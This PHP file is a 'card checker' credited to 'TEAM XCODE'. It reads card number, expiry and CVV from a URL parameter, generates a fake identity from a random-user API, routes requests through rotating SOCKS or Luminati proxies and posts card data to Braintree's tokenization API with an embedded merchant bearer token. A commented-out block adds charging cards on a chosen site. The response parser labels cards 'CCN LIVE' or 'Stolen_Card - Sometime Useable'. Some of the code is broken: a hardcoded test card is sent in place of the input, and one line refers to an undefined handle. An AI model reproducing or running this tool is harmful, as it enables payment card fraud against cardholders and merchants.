<?php

//FREE WORKING API BY [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function xcodeproxy()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = xcodeproxy();

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

////////////////////////////===[Luminati Details]

 $username = 'Put Zone Username Here';
$password = 'Put Zone Password Here';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

////////////////////////////===[For Authorizing Cards]

$ch = curl_init();
/////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//'accept: application/json', 
//'accept-language: en-IN,en;q=0.9,hi;q=0.8,hi-IN;q=0.7',
//'accept-encoding: gzip, deflate, br',
'content-type: application/x-www-form-urlencoded',
'origin: https://assets.braintreegateway.com',
'authorization:Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MDUwODkyNDIsImp0aSI6IjcxNmI4YzU4LTczN2EtNGI3Yy1iOWRkLWE5NzA0NThjNmU2MSIsInN1YiI6IjV2c3o3M3pxM3ZyNW1uZ3MiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjV2c3o3M3pxM3ZyNW1uZ3MiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJjdXN0b21lcl9pZCI6IjkwMTgzMDBPMzEzODkwMCJ9fQ.Ba4uXqwkBOu2qQL1n8jeH0BBFUETrd80rHU_epXoUHRuAhq9W93MoEwBUbsNMKUwGvrYdwWciddAfmrkpzOClw?customer_id=',
'referer: https://assets.braintreegateway.com/',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site'));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"ec28da40-a199-48fa-b313-a3129015b99b"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5522250002532116","expirationMonth":"10","expirationYear":"2024","cvv":"999","billingAddress":{"postalCode":"10080"}},"options":{"validate":true}}},"operationName":"TokenizeCreditCard"}');
$result = curl_exec($ch);
// $token = trim(strip_tags(getStr($result,'"id": "','"')));

////Uncomment this section for using 2req////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]

// $ch = curl_init();
// /////////========Luminati
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// ////////=========Socks Proxy
// //curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
// curl_setopt($ch, CURLOPT_URL, '#');
// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
//   'Host: '#',    [If No Host Data On Site Dont Uncomment It]  
//   'accept: '#',
//   'content-type: #',
//   'cookie: #',   [If No Cookie Data On Site Dont Uncomment It]
//   'Origin: #',
//   'referer: #',
//   'Sec-Fetch-Mode: #',
// ));
// curl_setopt($ch, CURLOPT_POSTFIELDS, '#');

// $result = curl_exec($ch);
// $message = trim(strip_tags(getStr($result,'"message":"','"'))); 

////////////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success"> ☄1�7 CVV MATCHED [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♄1�7 </span></br>';
}
elseif(strpos($result, "Thank You For Donation." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success"> ☄1�7 CVV MATCHED [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♄1�7 </span></br>';
}
elseif(strpos($result, "Thank You." )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success"> ☄1�7 CVC MATCHED [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] </span></br>';
}
elseif(strpos($result, 'security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✄1�7</span> <span class="badge badge-info"> ☄1�7 CCN LIVE  [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♄1�7 </span></br>';
}
elseif(strpos($result, 'security code is invalid.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✄1�7</span> <span class="badge badge-info"> ☄1�7 CCN LIVE [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]/span></br>';
}
elseif(strpos($result, 'Your card&#039;s security code is incorrect.' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✄1�7</span> <span class="badge badge-info"> ☄1�7 CCN LIVE [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] </span></br>';
}
elseif (strpos($result, "incorrect_cvc")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✄1�7</span> <span class="badge badge-info"> ☄1�7 CCN LIVE [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♄1�7 </span></br>';
}
elseif(strpos($result, 'incorrect_zip' )) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success"> ☄1�7 CVC MATCHED - Incorrect Zip [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♄1�7 </span></br>';
}
elseif (strpos($result, "stolen_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✄1�7</span> <span class="badge badge-info"> ☄1�7 Stolen_Card - Sometime Useable [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♄1�7 </span></br>';
}
elseif (strpos($result, "lost_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✄1�7</span> <span class="badge badge-info"> ☄1�7 Lost_Card - Sometime Useable [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♄1�7 </span></br>';
}
elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✄1�7</span> <span class="badge badge-info"> ☄1�7 Insufficient Funds [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♄1�7 </span></br>';
}
elseif(strpos($result, 'Your card has expired.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✄1�7</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✄1�7</span> <span class="badge badge-info"> ☄1�7 Card Expired [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♄1�7</span> </br>';
}
elseif (strpos($result, "pickup_card")) {
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✄1�7</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-info">✄1�7</span> <span class="badge badge-info"> ☄1�7 Pickup Card_Card - Sometime Useable [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♄1�7 </span></br>';
}
elseif(strpos($result, 'Your card number is incorrect.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✄1�7</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✄1�7</span> <span class="badge badge-info"> ☄1�7 Incorrect Card Number [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♄1�7</span> </br>';
}
 elseif (strpos($result, "incorrect_number")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✄1�7</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✄1�7</span> <span class="badge badge-info"> ☄1�7 Incorrect Card Number [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♄1�7</span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✄1�7</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✄1�7</span> <span class="badge badge-info"> ☄1�7 Card Declined [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♄1�7</span> </br>';
}
elseif (strpos($result, "generic_decline")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✄1�7</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✄1�7</span> <span class="badge badge-info"> ☄1�7 Declined : Generic_Decline [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘]♄1�7</span> </br>';
}
elseif (strpos($result, "do_not_honor")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✄1�7</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✄1�7</span> <span class="badge badge-info"> ☄1�7 Declined : Do_Not_Honor [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♄1�7</span> </br>';
}
elseif (strpos($result, '"cvc_check": "unchecked"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✄1�7</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✄1�7</span> <span class="badge badge-info"> ☄1�7 Security Code Check : Unchecked [Proxy Dead/change IP] [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♄1�7</span> </br>';
}
elseif (strpos($result, '"cvc_check": "fail"')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✄1�7</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✄1�7</span> <span class="badge badge-info"> ☄1�7 CvC Check Failed [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] </span> </br>';
}
elseif (strpos($result, "expired_card")) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✄1�7</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✄1�7</span> <span class="badge badge-info"> ☄1�7 Expired Card [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♄1�7</span> </br>';
}
elseif (strpos($result,'Your card does not support this type of purchase.')) {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✄1�7</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✄1�7</span> <span class="badge badge-info"> ☄1�7 Card Doesnt Support This Purchase [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♄1�7</span> </br>';
}
 else {
  echo '<span class="new badge red">#Reprovadas</span> <span class="new badge red">✄1�7</span> <span class="new badge red">' . $lista . '</span> <span class="new badge red">✄1�7</span> <span class="badge badge-info"> ☄1�7 Site Error [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] ♄1�7</span> </br>';
}

curl_close($ch);
ob_flush();
//////=========Comment Echo $result If U Want To Hide Site Side Response
echo $result 

///////////////////////////////////////////////===========xD========\\\\\\\\\\\\\\\
?>
